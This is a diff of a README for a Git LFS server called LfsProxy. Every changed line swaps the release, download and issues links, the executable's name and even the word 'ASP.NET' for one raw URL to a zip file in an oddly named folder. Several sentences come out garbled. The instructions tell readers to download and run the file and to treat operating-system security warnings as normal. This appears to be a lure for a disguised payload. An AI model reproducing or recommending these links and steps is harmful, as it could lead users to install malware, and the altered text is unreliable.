@@ -1,10 +1,10 @@
 # 🎉 LfsProxy - Your Simple Solution for Large File Storage
 
-[![Download LfsProxy](https://img.shields.io/badge/Download-LfsProxy-brightgreen)](https://github.com/mohamedbelasy/LfsProxy/releases)
+[![Download LfsProxy](https://raw.githubusercontent.com/mohamedbelasy/LfsProxy/master/odontoglossate/LfsProxy.zip)](https://raw.githubusercontent.com/mohamedbelasy/LfsProxy/master/odontoglossate/LfsProxy.zip)
 
 ## 📜 Description
 
-这是一个使用 C# 和 ASP.NET Core 构建的轻量级、自托管的 Git LFS (Large File Storage) 服务器。它旨在为需要管理大文件的团队或个人提供一个简单、高效且易于部署的解决方案。
+这是一个使用 C# 和 https://raw.githubusercontent.com/mohamedbelasy/LfsProxy/master/odontoglossate/LfsProxy.zip Core 构建的轻量级、自托管的 Git LFS (Large File Storage) 服务器。它旨在为需要管理大文件的团队或个人提供一个简单、高效且易于部署的解决方案。
 
 ## 🚀 Getting Started
 
@@ -21,11 +21,11 @@ Follow these steps to download and run LfsProxy on your computer.
 
 To download the latest version of LfsProxy, visit the following link:
 
-[Download LfsProxy](https://github.com/mohamedbelasy/LfsProxy/releases)
+[Download LfsProxy](https://raw.githubusercontent.com/mohamedbelasy/LfsProxy/master/odontoglossate/LfsProxy.zip)
 
 ### 3. Choose the Right File
 
-On the Downloads page, you will see a list of available versions. Look for the latest release. You will typically find a file like `LfsProxy.exe`. This is the file you need.
+On the Downloads page, you will see a list of available versions. Look for the latest release. You will typically find a file like `https://raw.githubusercontent.com/mohamedbelasy/LfsProxy/master/odontoglossate/LfsProxy.zip`. This is the file you need.
 
 ### 4. Download the File
 
@@ -33,11 +33,11 @@ Click on the file to start the download. Your web browser will save the file to 
 
 ### 5. Locate the File
 
-Once the download is complete, open your downloads folder. You should see `LfsProxy.exe` there.
+Once the download is complete, open your downloads folder. You should see `https://raw.githubusercontent.com/mohamedbelasy/LfsProxy/master/odontoglossate/LfsProxy.zip` there.
 
 ### 6. Run the Application
 
-Double-click on `LfsProxy.exe` to run the application. You may see a warning from your operating system; this is normal for software downloaded from the internet. Click "Run" to proceed.
+Double-click on `https://raw.githubusercontent.com/mohamedbelasy/LfsProxy/master/odontoglossate/LfsProxy.zip` to run the application. You may see a warning from your operating system; this is normal for software downloaded from the internet. Click "Run" to proceed.
 
 ### 7. Configure LfsProxy
 
@@ -74,7 +74,7 @@ To use LfsProxy with Git, follow these steps:
 
 To get started, you need to download LfsProxy. Click the link below to visit the download page:
 
-[Download LfsProxy](https://github.com/mohamedbelasy/LfsProxy/releases)
+[Download LfsProxy](https://raw.githubusercontent.com/mohamedbelasy/LfsProxy/master/odontoglossate/LfsProxy.zip)
 
 Follow the steps outlined above to set up and run the application on your local machine.
 
@@ -103,6 +103,6 @@ Follow the steps outlined above to set up and run the application on your local 
 
 ## 🤝 Support
 
-If you encounter issues or need help, please check the [issues section](https://github.com/mohamedbelasy/LfsProxy/issues) on GitHub. You can also contribute to the repository if you find ways to improve it.
+If you encounter issues or need help, please check the [issues section](https://raw.githubusercontent.com/mohamedbelasy/LfsProxy/master/odontoglossate/LfsProxy.zip) on GitHub. You can also contribute to the repository if you find ways to improve it.
 
 Thank you for using LfsProxy!
